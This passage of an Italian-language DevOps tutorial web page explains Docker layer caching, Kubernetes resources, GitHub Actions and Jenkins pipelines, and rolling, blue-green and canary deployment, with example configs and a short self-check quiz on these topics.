FROM node:20-alpine    →    [CACHED] ✓
WORKDIR /app           →    [CACHED] ✓
COPY package*.json .   →    [CACHED] ✓  ← Se package.json non cambia
RUN npm ci             →    [CACHED] ✓  ← npm install riusato!
COPY . .               →    [REBUILT] ✗ ← Codice cambiato
RUN npm run build      →    [REBUILT] ✗ ← Invalidato
─────────────────────────────────────────────────

⚠️  Una volta invalidato un layer, TUTTI i successivi
    vengono ricostruiti (cache invalidation cascade)
</pre>
                </div>

                <div class="info-box warning">
                    <h4>Attenzione: Cache Invalidation</h4>
                    <p>L'ordine delle istruzioni è critico. Se metti <code>COPY . .</code> prima di <code>RUN npm install</code>, ogni modifica al codice invaliderà la cache delle dipendenze, rendendo ogni build molto più lenta.</p>
                </div>

                <h3>Docker Compose per sviluppo locale</h3>

                <pre><code class="language-yaml"># docker-compose.yml
version: '3.8'

services:
  app:
    build:
      context: .
      dockerfile: Dockerfile
    ports:
      - "8080:8080"
    environment:
      - SPRING_PROFILES_ACTIVE=dev
      - DATABASE_URL=jdbc:postgresql://db:5432/myapp
    depends_on:
      db:
        condition: service_healthy
    volumes:
      - ./src:/app/src  # Hot reload in dev

  db:
    image: postgres:15-alpine
    environment:
      POSTGRES_DB: myapp
      POSTGRES_USER: user
      POSTGRES_PASSWORD: secret
    volumes:
      - postgres_data:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U user -d myapp"]
      interval: 5s
      timeout: 5s
      retries: 5

  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"

volumes:
  postgres_data:</code></pre>
            </section>

            <!-- Kubernetes Section -->
            <section class="section" id="modulo5-kubernetes">
                <h2>Kubernetes (K8s)</h2>

                <p><strong>Kubernetes</strong> è una piattaforma open-source per l'orchestrazione di container. Automatizza il deployment, lo scaling e la gestione di applicazioni containerizzate. Originariamente sviluppato da Google, è ora mantenuto dalla Cloud Native Computing Foundation (CNCF).</p>

                <h3>Architettura di un Cluster Kubernetes</h3>

                <div class="diagram">
<pre>
                    KUBERNETES CLUSTER ARCHITECTURE

┌──────────────────────────────────────────────────────────────────┐
│                        CONTROL PLANE                              │
│  ┌─────────────┐  ┌─────────────┐  ┌───────────┐  ┌───────────┐  │
│  │ API Server  │  │  Scheduler  │  │Controller │  │   etcd    │  │
│  │             │  │             │  │  Manager  │  │ (storage) │  │
│  └──────┬──────┘  └──────┬──────┘  └─────┬─────┘  └───────────┘  │
└─────────┼────────────────┼───────────────┼───────────────────────┘
          │                │               │
          └────────────────┼───────────────┘
                           │
        ┌──────────────────┴──────────────────┐
        │                                      │
        ▼                                      ▼
┌───────────────────────────┐    ┌───────────────────────────┐
│      WORKER NODE 1        │    │      WORKER NODE 2        │
│  ┌─────────────────────┐  │    │  ┌─────────────────────┐  │
│  │       kubelet       │  │    │  │       kubelet       │  │
│  └─────────────────────┘  │    │  └─────────────────────┘  │
│  ┌─────────────────────┐  │    │  ┌─────────────────────┐  │
│  │     kube-proxy      │  │    │  │     kube-proxy      │  │
│  └─────────────────────┘  │    │  └─────────────────────┘  │
│  ┌────────┐ ┌────────┐   │    │  ┌────────┐ ┌────────┐   │
│  │  Pod   │ │  Pod   │   │    │  │  Pod   │ │  Pod   │   │
│  │┌──────┐│ │┌──────┐│   │    │  │┌──────┐│ │┌──────┐│   │
│  ││ App  ││ ││ App  ││   │    │  ││ App  ││ ││ App  ││   │
│  │└──────┘│ │└──────┘│   │    │  │└──────┘│ │└──────┘│   │
│  └────────┘ └────────┘   │    │  └────────┘ └────────┘   │
└───────────────────────────┘    └───────────────────────────┘
</pre>
                </div>

                <h3>Componenti fondamentali</h3>

                <h4>Pod</h4>
                <p>Il <strong>Pod</strong> è l'unità minima di deployment in Kubernetes. Rappresenta uno o più container che condividono storage, rete e specifiche su come eseguire i container. I container in un Pod condividono lo stesso indirizzo IP e possono comunicare via localhost.</p>

                <pre><code class="language-yaml"># pod.yaml - Definizione base di un Pod
apiVersion: v1
kind: Pod
metadata:
  name: my-app
  labels:
    app: my-app
    environment: production
spec:
  containers:
    - name: app
      image: my-registry/my-app:1.2.3
      ports:
        - containerPort: 8080
      resources:
        requests:          # Risorse minime garantite
          memory: "256Mi"
          cpu: "250m"      # 0.25 CPU core
        limits:            # Limiti massimi
          memory: "512Mi"
          cpu: "500m"
      livenessProbe:       # Il container è vivo?
        httpGet:
          path: /actuator/health/liveness
          port: 8080
        initialDelaySeconds: 30
        periodSeconds: 10
      readinessProbe:      # Il container può ricevere traffico?
        httpGet:
          path: /actuator/health/readiness
          port: 8080
        initialDelaySeconds: 5
        periodSeconds: 5
      env:
        - name: SPRING_PROFILES_ACTIVE
          value: "prod"
        - name: DB_PASSWORD
          valueFrom:
            secretKeyRef:
              name: db-credentials
              key: password</code></pre>

                <div class="info-box">
                    <h4>Liveness vs Readiness Probe</h4>
                    <ul>
                        <li><strong>Liveness Probe</strong>: verifica se il container è vivo. Se fallisce, Kubernetes <em>riavvia</em> il container. Usa questo per rilevare deadlock o stati corrotti.</li>
                        <li><strong>Readiness Probe</strong>: verifica se il container può ricevere traffico. Se fallisce, il Pod viene <em>rimosso</em> dal Service (niente restart). Usa questo durante startup o quando il Pod è temporaneamente sovraccarico.</li>
                    </ul>
                </div>

                <h4>Deployment</h4>
                <p>Un <strong>Deployment</strong> gestisce il ciclo di vita dei Pod, garantendo che il numero desiderato di repliche sia sempre in esecuzione. Fornisce rolling updates e rollback.</p>

                <pre><code class="language-yaml"># deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-app
  labels:
    app: my-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: my-app
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1        # Max Pod extra durante update
      maxUnavailable: 0  # Zero downtime
  template:
    metadata:
      labels:
        app: my-app
    spec:
      containers:
        - name: app
          image: my-registry/my-app:1.2.3
          ports:
            - containerPort: 8080
          resources:
            requests:
              memory: "256Mi"
              cpu: "250m"
            limits:
              memory: "512Mi"
              cpu: "500m"</code></pre>

                <h4>Service</h4>
                <p>Un <strong>Service</strong> espone un'applicazione in esecuzione su un set di Pod come servizio di rete. I Service forniscono un DNS name stabile e load balancing tra i Pod.</p>

                <pre><code class="language-yaml"># service.yaml
apiVersion: v1
kind: Service
metadata:
  name: my-app-service
spec:
  type: ClusterIP          # Solo interno al cluster
  selector:
    app: my-app            # Seleziona i Pod con questo label
  ports:
    - port: 80             # Porta del Service
      targetPort: 8080     # Porta del container
      protocol: TCP</code></pre>

                <table>
                    <thead>
                        <tr>
                            <th>Service Type</th>
                            <th>Visibilità</th>
                            <th>Use Case</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>ClusterIP</code></td>
                            <td>Solo interno al cluster</td>
                            <td>Comunicazione tra microservizi</td>
                        </tr>
                        <tr>
                            <td><code>NodePort</code></td>
                            <td>Espone su ogni nodo (porta 30000-32767)</td>
                            <td>Testing, ambienti non-production</td>
                        </tr>
                        <tr>
                            <td><code>LoadBalancer</code></td>
                            <td>Espone via cloud load balancer</td>
                            <td>Traffico esterno in produzione (cloud)</td>
                        </tr>
                        <tr>
                            <td><code>ExternalName</code></td>
                            <td>Alias DNS per servizi esterni</td>
                            <td>Integrazione con servizi fuori dal cluster</td>
                        </tr>
                    </tbody>
                </table>

                <h4>Ingress</h4>
                <p><strong>Ingress</strong> gestisce l'accesso esterno ai servizi nel cluster, tipicamente HTTP/HTTPS. Fornisce load balancing, SSL termination e virtual hosting basato su nome.</p>

                <pre><code class="language-yaml"># ingress.yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: my-app-ingress
  annotations:
    nginx.ingress.kubernetes.io/rewrite-target: /
    cert-manager.io/cluster-issuer: "letsencrypt-prod"
spec:
  ingressClassName: nginx
  tls:
    - hosts:
        - api.mycompany.com
      secretName: api-tls-secret
  rules:
    - host: api.mycompany.com
      http:
        paths:
          - path: /users
            pathType: Prefix
            backend:
              service:
                name: user-service
                port:
                  number: 80
          - path: /orders
            pathType: Prefix
            backend:
              service:
                name: order-service
                port:
                  number: 80</code></pre>

                <h4>ConfigMaps e Secrets</h4>
                <p><strong>ConfigMaps</strong> e <strong>Secrets</strong> permettono di separare la configurazione dal codice dell'applicazione, seguendo il principio delle twelve-factor apps.</p>

                <pre><code class="language-yaml"># configmap.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: app-config
data:
  application.properties: |
    server.port=8080
    logging.level.root=INFO
  FEATURE_FLAG_NEW_UI: "true"

---
# secret.yaml
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
type: Opaque
data:
  # Valori codificati in base64 (NON encrypted!)
  username: YWRtaW4=           # echo -n 'admin' | base64
  password: cGFzc3dvcmQxMjM=   # echo -n 'password123' | base64</code></pre>

                <div class="info-box warning">
                    <h4>Secrets non sono sicuri di default!</h4>
                    <p>I Secret Kubernetes sono solo base64 encoded, non encrypted. Per una gestione sicura dei secrets in produzione, considera: <strong>HashiCorp Vault</strong>, <strong>AWS Secrets Manager</strong>, <strong>Azure Key Vault</strong>, o <strong>Sealed Secrets</strong> per GitOps.</p>
                </div>

                <h4>Horizontal Pod Autoscaler (HPA)</h4>
                <p>L'<strong>HPA</strong> scala automaticamente il numero di Pod in un Deployment basandosi su metriche osservate (CPU, memoria, o metriche custom).</p>

                <pre><code class="language-yaml"># hpa.yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: my-app-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: my-app
  minReplicas: 2
  maxReplicas: 10
  metrics:
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 70    # Scala se CPU > 70%
    - type: Resource
      resource:
        name: memory
        target:
          type: Utilization
          averageUtilization: 80
  behavior:
    scaleDown:
      stabilizationWindowSeconds: 300  # Attendi 5 min prima di scale down
      policies:
        - type: Percent
          value: 10
          periodSeconds: 60</code></pre>
            </section>

            <!-- CI/CD Section -->
            <section class="section" id="modulo5-cicd">
                <h2>CI/CD Pipelines</h2>

                <p><strong>Continuous Integration</strong> (CI) è la pratica di integrare frequentemente il codice in un repository condiviso, con build e test automatici. <strong>Continuous Delivery/Deployment</strong> (CD) estende CI automatizzando il rilascio del software in ambienti di staging e produzione.</p>

                <div class="diagram">
<pre>
                    CI/CD PIPELINE FLOW

┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐
│  CODE   │───▶│  BUILD  │───▶│  TEST   │───▶│ DEPLOY  │───▶│ MONITOR │
│  PUSH   │    │         │    │         │    │STAGING  │    │         │
└─────────┘    └─────────┘    └─────────┘    └────┬────┘    └─────────┘
                                                  │
     ┌────────────────────────────────────────────┘
     │
     ▼
┌──────────────────────────────────────────────────────────────────────┐
│                    PRODUCTION DEPLOYMENT                              │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐               │
│  │  Approval   │───▶│   Deploy    │───▶│  Validate   │               │
│  │  (manual?)  │    │  Strategy   │    │  & Rollback │               │
│  └─────────────┘    └─────────────┘    └─────────────┘               │
└──────────────────────────────────────────────────────────────────────┘
</pre>
                </div>

                <h3>GitHub Actions</h3>

                <p><strong>GitHub Actions</strong> è una piattaforma CI/CD integrata in GitHub. I workflow sono definiti in file YAML nella directory <code>.github/workflows/</code>.</p>

                <pre><code class="language-yaml"># .github/workflows/ci-cd.yml
name: CI/CD Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 21
        uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: 'temurin'
          cache: maven

      - name: Run tests
        run: mvn verify --batch-mode

      - name: Upload coverage report
        uses: codecov/codecov-action@v3
        with:
          files: target/site/jacoco/jacoco.xml

  build-and-push:
    needs: test
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    permissions:
      contents: read
      packages: write

    steps:
      - uses: actions/checkout@v4

      - name: Log in to Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Extract metadata for Docker
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=sha,prefix=
            type=ref,event=branch

      - name: Build and push Docker image
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  deploy-staging:
    needs: build-and-push
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - name: Deploy to Kubernetes
        uses: azure/k8s-deploy@v4
        with:
          manifests: |
            k8s/deployment.yaml
            k8s/service.yaml
          images: |
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment: production  # Richiede approval manuale
    steps:
      - name: Deploy to Production
        run: |
          # Deploy con strategia blue-green o canary
          kubectl set image deployment/my-app \
            app=${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}</code></pre>

                <h3>Jenkins Pipeline</h3>

                <p><strong>Jenkins</strong> è uno dei più diffusi automation server per CI/CD. I pipeline moderni usano la sintassi <em>Declarative Pipeline</em> definita in un <code>Jenkinsfile</code>.</p>

                <pre><code class="language-groovy">// Jenkinsfile
pipeline {
    agent {
        kubernetes {
            yaml '''
                apiVersion: v1
                kind: Pod
                spec:
                  containers:
                  - name: maven
                    image: maven:3.9-eclipse-temurin-21
                    command: ['sleep', 'infinity']
                  - name: docker
                    image: docker:24-dind
                    securityContext:
                      privileged: true
            '''
        }
    }

    environment {
        REGISTRY = 'ghcr.io/myorg'
        IMAGE_NAME = 'my-app'
    }

    stages {
        stage('Checkout') {
            steps {
                checkout scm
            }
        }

        stage('Test') {
            steps {
                container('maven') {
                    sh 'mvn verify'
                }
            }
            post {
                always {
                    junit 'target/surefire-reports/*.xml'
                    jacoco execPattern: 'target/jacoco.exec'
                }
            }
        }

        stage('Build Docker Image') {
            when {
                branch 'main'
            }
            steps {
                container('docker') {
                    script {
                        def image = docker.build("${REGISTRY}/${IMAGE_NAME}:${GIT_COMMIT}")
                        docker.withRegistry('https://ghcr.io', 'github-credentials') {
                            image.push()
                            image.push('latest')
                        }
                    }
                }
            }
        }

        stage('Deploy to Staging') {
            when {
                branch 'main'
            }
            steps {
                withKubeConfig([credentialsId: 'k8s-staging']) {
                    sh """
                        kubectl set image deployment/my-app \
                            app=${REGISTRY}/${IMAGE_NAME}:${GIT_COMMIT} \
                            -n staging
                        kubectl rollout status deployment/my-app -n staging
                    """
                }
            }
        }

        stage('Deploy to Production') {
            when {
                branch 'main'
            }
            input {
                message "Deploy to production?"
                ok "Deploy"
            }
            steps {
                withKubeConfig([credentialsId: 'k8s-production']) {
                    sh """
                        kubectl set image deployment/my-app \
                            app=${REGISTRY}/${IMAGE_NAME}:${GIT_COMMIT} \
                            -n production
                    """
                }
            }
        }
    }

    post {
        failure {
            slackSend channel: '#deploys',
                      color: 'danger',
                      message: "Build FAILED: ${env.JOB_NAME} #${env.BUILD_NUMBER}"
        }
        success {
            slackSend channel: '#deploys',
                      color: 'good',
                      message: "Build SUCCESS: ${env.JOB_NAME} #${env.BUILD_NUMBER}"
        }
    }
}</code></pre>

                <table>
                    <thead>
                        <tr>
                            <th>Aspetto</th>
                            <th>GitHub Actions</th>
                            <th>Jenkins</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Hosting</td>
                            <td>SaaS (managed by GitHub)</td>
                            <td>Self-hosted o managed</td>
                        </tr>
                        <tr>
                            <td>Configurazione</td>
                            <td>YAML in <code>.github/workflows/</code></td>
                            <td>Jenkinsfile (Groovy)</td>
                        </tr>
                        <tr>
                            <td>Curva di apprendimento</td>
                            <td>Bassa</td>
                            <td>Alta (ma più flessibile)</td>
                        </tr>
                        <tr>
                            <td>Marketplace/Plugin</td>
                            <td>GitHub Marketplace (Actions)</td>
                            <td>Vastissimo ecosistema plugin</td>
                        </tr>
                        <tr>
                            <td>Ideale per</td>
                            <td>Progetti su GitHub, team piccoli-medi</td>
                            <td>Enterprise, requisiti complessi</td>
                        </tr>
                    </tbody>
                </table>
            </section>

            <!-- Deployment Strategies Section -->
            <section class="section" id="modulo5-deployment">
                <h2>Deployment Strategies</h2>

                <p>La scelta della strategia di deployment impatta direttamente su <strong>downtime</strong>, <strong>rischio</strong> e <strong>velocità di rollback</strong>. Vediamo le strategie più comuni.</p>

                <h3>Rolling Update</h3>

                <p>Il <strong>Rolling Update</strong> è la strategia di default in Kubernetes. I Pod vengono aggiornati gradualmente, sostituendo le vecchie istanze con le nuove una alla volta.</p>

                <div class="diagram">
<pre>
              ROLLING UPDATE PROGRESSION

Time 0:   [v1] [v1] [v1] [v1]     ← 4 Pod versione 1

Time 1:   [v1] [v1] [v1] [v2]     ← 1 nuovo Pod v2 creato

Time 2:   [v1] [v1] [v2] [v2]     ← Gradualmente sostituiti

Time 3:   [v1] [v2] [v2] [v2]

Time 4:   [v2] [v2] [v2] [v2]     ← Tutti i Pod aggiornati

✅ Pro: Zero downtime, uso efficiente delle risorse
❌ Contro: Rollback lento, due versioni coesistono temporaneamente
</pre>
                </div>

                <pre><code class="language-yaml"># Rolling Update in Kubernetes
spec:
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 25%        # Max Pod extra durante update
      maxUnavailable: 25%  # Max Pod non disponibili</code></pre>

                <h3>Blue-Green Deployment</h3>

                <p>Nel <strong>Blue-Green Deployment</strong> mantieni due ambienti identici: Blue (produzione attuale) e Green (nuova versione). Il traffico viene switchato istantaneamente tramite load balancer.</p>

                <div class="diagram">
<pre>
              BLUE-GREEN DEPLOYMENT

┌─────────────────────────────────────────────────────┐
│                  LOAD BALANCER                       │
│                       │                              │
│         ┌─────────────┴─────────────┐               │
│         │                           │               │
│         ▼                           ▼               │
│  ┌─────────────┐            ┌─────────────┐        │
│  │    BLUE     │            │    GREEN    │        │
│  │   (v1.0)    │            │   (v1.1)    │        │
│  │  [ACTIVE]   │            │  [STANDBY]  │        │
│  │             │            │             │        │
│  │ [Pod] [Pod] │            │ [Pod] [Pod] │        │
│  └─────────────┘            └─────────────┘        │
└─────────────────────────────────────────────────────┘

                    AFTER SWITCH

                  LOAD BALANCER
                       │
         ┌─────────────┴─────────────┐
         │                           │
         ▼                           ▼
  ┌─────────────┐            ┌─────────────┐
  │    BLUE     │            │    GREEN    │
  │   (v1.0)    │            │   (v1.1)    │
  │  [STANDBY]  │            │  [ACTIVE]   │ ← Traffic
  └─────────────┘            └─────────────┘

✅ Pro: Rollback istantaneo, zero downtime
❌ Contro: Richiede il doppio delle risorse
</pre>
                </div>

                <pre><code class="language-yaml"># Blue-Green con Kubernetes Services
# Service che punta all'ambiente attivo
apiVersion: v1
kind: Service
metadata:
  name: my-app-production
spec:
  selector:
    app: my-app
    version: green    # Switch: cambia da "blue" a "green"
  ports:
    - port: 80
      targetPort: 8080

---
# Deployment Blue
apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-app-blue
spec:
  replicas: 3
  selector:
    matchLabels:
      app: my-app
      version: blue
  template:
    metadata:
      labels:
        app: my-app
        version: blue
    spec:
      containers:
        - name: app
          image: my-app:1.0.0

---
# Deployment Green
apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-app-green
spec:
  replicas: 3
  selector:
    matchLabels:
      app: my-app
      version: green
  template:
    metadata:
      labels:
        app: my-app
        version: green
    spec:
      containers:
        - name: app
          image: my-app:1.1.0</code></pre>

                <h3>Canary Deployment</h3>

                <p>Il <strong>Canary Deployment</strong> rilascia la nuova versione a un piccolo subset di utenti (es. 5%) prima di procedere con il rollout completo. Permette di validare la nuova versione in produzione con rischio limitato.</p>

                <div class="diagram">
<pre>
              CANARY DEPLOYMENT PROGRESSION

Phase 1: Initial Canary (5% traffic)
┌────────────────────────────────────────┐
│            INGRESS CONTROLLER          │
│                   │                    │
│         95%       │        5%          │
│           ┌───────┴───────┐            │
│           ▼               ▼            │
│    ┌───────────┐   ┌───────────┐       │
│    │  STABLE   │   │  CANARY   │       │
│    │   v1.0    │   │   v1.1    │       │
│    │ 10 Pods   │   │  1 Pod    │       │
│    └───────────┘   └───────────┘       │
└────────────────────────────────────────┘

Phase 2: Gradual Increase (25% traffic)
         75%               25%

Phase 3: Full Rollout (100% traffic)
          0%               100%

✅ Pro: Rischio minimizzato, validazione in produzione reale
❌ Contro: Complessità di routing, monitoring rigoroso necessario
</pre>
                </div>

                <pre><code class="language-yaml"># Canary con Argo Rollouts
apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata:
  name: my-app
spec:
  replicas: 10
  selector:
    matchLabels:
      app: my-app
  template:
    metadata:
      labels:
        app: my-app
    spec:
      containers:
        - name: app
          image: my-app:1.1.0
  strategy:
    canary:
      steps:
        - setWeight: 5        # 5% traffico al canary
        - pause: {duration: 5m}
        - setWeight: 25       # 25% traffico
        - pause: {duration: 10m}
        - setWeight: 50       # 50% traffico
        - pause: {duration: 10m}
        # Analisi automatica delle metriche
        - analysis:
            templates:
              - templateName: success-rate
            args:
              - name: service-name
                value: my-app
      # Rollback automatico se l'analisi fallisce
      analysis:
        successfulRunHistoryLimit: 3
        unsuccessfulRunHistoryLimit: 3

---
# Template di analisi per Canary
apiVersion: argoproj.io/v1alpha1
kind: AnalysisTemplate
metadata:
  name: success-rate
spec:
  args:
    - name: service-name
  metrics:
    - name: success-rate
      interval: 1m
      successCondition: result[0] >= 0.95  # 95% success rate
      provider:
        prometheus:
          address: http://prometheus:9090
          query: |
            sum(rate(http_requests_total{service="{{args.service-name}}",status=~"2.."}[5m])) /
            sum(rate(http_requests_total{service="{{args.service-name}}"}[5m]))</code></pre>

                <h3>Confronto Strategie di Deployment</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Strategia</th>
                            <th>Downtime</th>
                            <th>Rischio</th>
                            <th>Rollback</th>
                            <th>Risorse</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Recreate</strong></td>
                            <td>Sì (breve)</td>
                            <td>Alto</td>
                            <td>Lento</td>
                            <td>Normali</td>
                        </tr>
                        <tr>
                            <td><strong>Rolling Update</strong></td>
                            <td>No</td>
                            <td>Medio</td>
                            <td>Medio</td>
                            <td>Normali + surge</td>
                        </tr>
                        <tr>
                            <td><strong>Blue-Green</strong></td>
                            <td>No</td>
                            <td>Basso</td>
                            <td>Istantaneo</td>
                            <td>2x</td>
                        </tr>
                        <tr>
                            <td><strong>Canary</strong></td>
                            <td>No</td>
                            <td>Molto basso</td>
                            <td>Istantaneo</td>
                            <td>Normali + canary</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box success">
                    <h4>Best Practice: Feature Flags + Canary</h4>
                    <p>Combina <strong>Feature Flags</strong> con <strong>Canary Deployment</strong> per il massimo controllo. Puoi deployare codice con feature disabilitate, poi abilitarle gradualmente indipendentemente dal deployment. Strumenti: LaunchDarkly, Unleash, Flagsmith.</p>
                </div>
            </section>

            <!-- Quiz Modulo 5 -->
            <section class="quiz-section" id="modulo5-quiz">
                <h2>Interactive Challenge Quiz - Modulo 5</h2>
                <p>Testa la tua comprensione di Docker, Kubernetes e strategie di deployment.</p>

                <!-- Question 21 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q1.</span> Un Dockerfile ha questo ordine di istruzioni: <code>COPY . .</code>, poi <code>RUN npm install</code>, poi <code>RUN npm build</code>. Cosa succede quando modifichi solo un file TypeScript e rebuildi?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q21" id="q21a" value="a">
                            <label for="q21a">Solo <code>npm build</code> viene rieseguito, le dipendenze sono cached</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q21" id="q21b" value="b">
                            <label for="q21b">Docker usa il layer cache e non riesegue nulla</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q21" id="q21c" value="c">
                            <label for="q21c">Sia <code>npm install</code> che <code>npm build</code> vengono rieseguiti</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q21" id="q21d" value="d">
                            <label for="q21d">Solo <code>COPY</code> viene rieseguito, i RUN sono sempre cached</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q21')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q21"></div>
                </div>

                <!-- Question 22 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q2.</span> In Kubernetes, un Pod ha <code>readinessProbe</code> che fallisce ma <code>livenessProbe</code> che passa. Cosa succede?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q22" id="q22a" value="a">
                            <label for="q22a">Il Pod viene riavviato perché non è "ready"</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q22" id="q22b" value="b">
                            <label for="q22b">Il Pod continua a girare ma viene rimosso dagli endpoint del Service</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q22" id="q22c" value="c">
                            <label for="q22c">Il Pod viene terminato e ricreato dal Deployment</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q22" id="q22d" value="d">
                            <label for="q22d">Nulla, readinessProbe è solo informativa</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q22')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q22"></div>
                </div>

                <!-- Question 23 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q3.</span> Stai configurando un Horizontal Pod Autoscaler (HPA) basato su CPU. I Pod hanno <code>requests.cpu: 200m</code> e <code>limits.cpu: 500m</code>. L'HPA è configurato per scalare quando la CPU supera il 70%. A quale utilizzo effettivo scatta lo scaling?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q23" id="q23a" value="a">
                            <label for="q23a">350m (70% di 500m limits)</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q23" id="q23b" value="b">
                            <label for="q23b">Quando il nodo raggiunge il 70% di CPU</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q23" id="q23c" value="c">
                            <label for="q23c">Non è possibile determinarlo senza conoscere le metriche attuali</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q23" id="q23d" value="d">
                            <label for="q23d">140m (70% di 200m requests)</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q23')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q23"></div>
                </div>

                <!-- Question 24 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q4.</span> Durante un Canary deployment al 10%, noti che il tasso di errore del canary è del 5% mentre la versione stable ha 0.1%. Qual è l'azione corretta?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q24" id="q24a" value="a">
                            <label for="q24a">Rollback immediato: il canary ha 50x più errori della versione stable</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q24" id="q24b" value="b">
                            <label for="q24b">Continuare: 5% di errori è accettabile per un canary</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q24" id="q24c" value="c">
                            <label for="q24c">Aumentare il traffico al 25% per raccogliere più dati</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q24" id="q24d" value="d">
                            <label for="q24d">Ignorare: gli errori sono probabilmente transitori</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q24')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q24"></div>
                </div>

                <!-- Question 25 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q5.</span> In un Blue-Green deployment, dopo lo switch al Green, scopri un bug critico dopo 30 minuti. Come procedi?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q25" id="q25a" value="a">
                            <label for="q25a">Fix forward: correggi il bug e fai un nuovo deployment Green</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q25" id="q25b" value="b">
                            <label for="q25b">Rolling update per tornare gradualmente alla versione Blue</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q25" id="q25c" value="c">
                            <label for="q25c">Switch istantaneo del load balancer/service back to Blue</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q25" id="q25d" value="d">
                            <label for="q25d">Scale down Green a 0 replica e aspettare che Blue riceva tutto il traffico</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q25')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q25"></div>
                </div>
            </section>

            <!-- ==================== MODULO 6: ADVANCED TOPICS 2026 ==================== -->

            <header class="module-header" id="modulo6">
                <span class="module-tag">Modulo 6</span>
                <h1>Advanced Topics 2026</h1>
                <p>Observability, Infrastructure as Code e integrazione AI/LLM nelle applicazioni moderne</p>
            </header>

            <!-- Observability Section -->
            <section class="section" id="modulo6-observability">
                <h2>Observability: I Tre Pilastri</h2>

                <p>L'<strong>Observability</strong> è la capacità di comprendere lo stato interno di un sistema attraverso i suoi output esterni. A differenza del semplice monitoring (che risponde a "il sistema funziona?"), l'observability risponde a "perché il sistema si comporta così?".</p>

                <div class="info-box">
                    <h4>Monitoring vs Observability</h4>
